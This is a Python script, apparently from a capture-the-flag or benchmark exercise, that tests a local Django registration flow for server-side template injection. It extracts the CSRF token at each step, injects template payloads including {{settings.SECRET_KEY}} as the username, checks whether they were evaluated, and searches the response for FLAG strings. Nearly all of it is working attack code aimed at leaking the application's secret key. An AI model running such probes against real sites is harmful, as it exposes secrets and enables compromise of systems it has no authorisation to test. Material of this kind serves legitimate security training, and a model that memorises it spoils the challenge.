import requests
from bs4 import BeautifulSoup
import re

base_url = "http://127.0.0.1:32896"

# Test payloads specifically for Django template evaluation
payloads = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{settings.SECRET_KEY}}",
]

for payload in payloads:
    print(f"\n{'='*60}")
    print(f"Testing payload: {payload}")
    print('='*60)
    
    session = requests.Session()
    
    try:
        # Step 1
        r = session.get(f'{base_url}/accounts/register/step1/')
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
        
        r = session.post(f'{base_url}/accounts/register/step1/', 
            data={'csrfmiddlewaretoken': csrf, 'name': payload, 'password': 'TestPass123!'})
        
        # Step 2
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
        
        r = session.post(f'{base_url}/accounts/register/step2/', 
            data={'csrfmiddlewaretoken': csrf, 'email': f'test{abs(hash(payload))}@example.com'})
        
        # Step 3 - Check JavaScript content
        print(f"\n--- Step 3 Response Analysis ---")
        
        if '<script>' in r.text:
            # Extract the script tag content
            start = r.text.find('<script>alert("Hello ')
            end = r.text.find('")</script>', start)
            if start != -1 and end != -1:
                username_rendered = r.text[start+22:end]
                print(f"Original payload: {payload}")
                print(f"Rendered as: {username_rendered}")
                
                # Check for SSTI evaluation
                if payload == "{{7*7}}":
                    if "49" in username_rendered and "{{" not in username_rendered:
                        print("🚨 SSTI CONFIRMED: {{7*7}} evaluated to 49!")
                    elif "{{7*7}}" in username_rendered:
                        print("❌ Template syntax NOT evaluated (literal rendering)")
                    else:
                        print(f"⚠️  Unexpected result: {username_rendered}")
                
                elif payload == "{{7*'7'}}":
                    if "7777777" in username_rendered:
                        print("🚨 SSTI CONFIRMED: {{7*'7'}} evaluated to 7777777!")
                    elif "{{7*'7'}}" in username_rendered:
                        print("❌ Template syntax NOT evaluated (literal rendering)")
                    else:
                        print(f"⚠️  Unexpected result: {username_rendered}")
                
                elif "SECRET_KEY" in payload or "settings" in payload:
                    if "SECRET" in username_rendered or len(username_rendered) > 30:
                        print("🚨 CRITICAL: Django SECRET_KEY or settings exposed!")
                        print(f"Exposed value: {username_rendered}")
                    elif payload in username_rendered:
                        print("❌ Template syntax NOT evaluated (literal rendering)")
                    else:
                        print(f"⚠️  Unexpected result: {username_rendered}")
        
        # Look for FLAG in entire response
        if 'FLAG{' in r.text:
            flags = re.findall(r'FLAG\{[^}]+\}', r.text)
            print(f"\n🚩 FLAG FOUND: {flags}")
            # Show context around flag
            for flag in flags:
                idx = r.text.find(flag)
                context = r.text[max(0, idx-100):min(len(r.text), idx+len(flag)+100)]
                print(f"Context: ...{context}...")
        
        # Show full script tag for analysis
        script_match = re.search(r'<script>.*?</script>', r.text, re.DOTALL)
        if script_match:
            print(f"\n--- Full Script Tag Content ---")
            print(script_match.group(0))
    
    except Exception as e:
        print(f"❌ Error testing payload: {e}")
        import traceback
        traceback.print_exc()

print("\n" + "="*60)
print("SSTI Testing Complete")
print("="*60)
